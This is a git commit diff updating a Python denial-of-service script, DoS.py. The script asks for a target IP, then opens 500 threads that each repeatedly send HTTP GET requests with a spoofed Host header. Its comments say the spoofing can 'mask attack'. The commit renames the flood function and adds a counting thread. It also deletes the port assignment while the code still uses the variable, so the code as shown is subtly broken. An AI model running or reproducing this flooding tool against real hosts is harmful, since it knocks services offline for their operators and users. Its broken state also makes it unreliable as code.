a9034e49f031630bee06f5323a8a717261cc794d
Owen Jones <142271569+NTPOJ@users.noreply.github.com>
2024-02-19 18:32:28 +1100

    Update DoS.py

--- DoS.py
+++ DoS.py
@@ -21,13 +21,11 @@ while True:
     target = input("Enter target IP:")
     fake_ip = input("Enter host IP:")
 
-    # Specifies port to run attack on
-    port = 80
-
     # Attack is defined with sockets module
     # Send HTTP GET requests to target IP
     # HOST can be any IP address. Can use fake IP to mask attack
-    def attack():
+    # Function for the attack
+    def single_attack():
         while True:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((target, port))
@@ -35,29 +33,23 @@ while True:
             s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
             s.close()
 
-    # Runs 500 threads of the defined attack
-    # Threads can be set to a higher number for more requests.
+    # Run 500 threads of the defined attack
     for i in range(500):
-        thread = threading.Thread(target=attack)
+        thread = threading.Thread(target=single_attack)
         thread.start()
 
     attack_num = 0
 
-    # Attack output is defined
-    def attack():
+    # Function to count attacks
+    def count_attacks():
+        global attack_num
         while True:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((target, port))
-            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-            s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-            s.close()
-
-            # Global allows to modify variable
-            global attack_num
             attack_num += 1
             print(attack_num)
 
-            s.close()
+    # Start a separate thread for counting attacks
+    count_thread = threading.Thread(target=count_attacks)
+    count_thread.start()
 
     print("What's next comrade?")
 
